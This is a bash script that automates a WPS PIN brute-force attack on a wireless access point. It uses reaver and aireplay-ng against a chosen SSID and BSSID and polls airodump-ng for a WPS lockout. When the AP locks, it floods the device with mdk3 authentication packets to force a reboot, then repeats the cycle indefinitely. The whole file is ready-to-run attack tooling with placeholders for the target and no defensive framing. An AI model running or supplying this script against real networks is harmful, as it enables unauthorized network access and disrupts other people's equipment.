#!/bin/bash

# Replace these with your AP and MAC information
AP_SSID="AP_SSID"
AP_BSSID="AP_BSSID"
MY_MAC="MY_MAC"
REAVER_SESSION="PREV_SESSION.wpc"
WAIT_TIME=300

# Define function to detect AP channel
detect_ap_channel() {
    echo "Detecting AP channel..."
    timeout 45 reaver -i wlan0mon -e "$AP_SSID" -b "$AP_BSSID" -vv > ap_channel
    timeout 15 aireplay-ng -1 0 -e "$AP_SSID" -a "$AP_BSSID" -h "$MY_MAC" wlan0mon > ap_channel
    channel=$(grep -oP 'Channel\s*\K\d+' ap_channel | head -n 1)
    rm -f ap_channel
    if [[ -z $channel ]]; then
        echo "Failed to detect channel. Retrying..."
        return 1
    fi
    echo "Detected AP channel: $channel"
    return 0
}

# Function to check if WPS is locked
check_wps_status() {
    echo "Checking WPS status..."
    airodump-ng wlan0mon --wps --essid "$AP_SSID" -c "$channel" > ap_status 2>&1 &
    airodump_pid=$!
    sleep 10
    kill -9 "$airodump_pid"
    grep -q "Locked" ap_status
}

# Function to perform reaver attack
perform_reaver_attack() {
    echo "Performing reaver attack..."
    aireplay-ng -1 0 -e "$AP_SSID" -a "$AP_BSSID" -h "$MY_MAC" wlan0mon
    timeout 30 reaver -i wlan0mon -e "$AP_SSID" -b "$AP_BSSID" --no-nacks -vv -s "$REAVER_SESSION" -w -A -g 1 -C gnome-screenshot -f
}

# Function to attempt AP reboot using mdk3 (or mdk4 if available)
attempt_ap_reboot() {
    echo "Attempting to reboot the AP..."
    mdk3 wlan0mon a -a "$AP_BSSID" -m > attack 2>&1 &
    mdk3_pid=$!
    sleep 10
    check_wps_status && return 1
    kill -9 "$mdk3_pid"
    return 0
}

while true; do
    rm -f attack ap_status ap_channel

    # Step 1: Detect AP Channel
    until detect_ap_channel; do sleep 5; done

    # Step 2: Start reaver attacks until WPS locks
    while ! check_wps_status; do
        perform_reaver_attack
        sleep 5
    done

    # Step 3: If WPS is locked, try to unlock by rebooting the AP
    echo "WPS is locked. Initiating AP reboot sequence..."
    until attempt_ap_reboot; do
        echo "Retrying AP reboot..."
        sleep 10
    done

    # Step 4: Wait for AP to reset and unlock WPS
    echo "AP rebooted. Waiting $WAIT_TIME seconds for AP to initialize..."
    sleep "$WAIT_TIME"
done
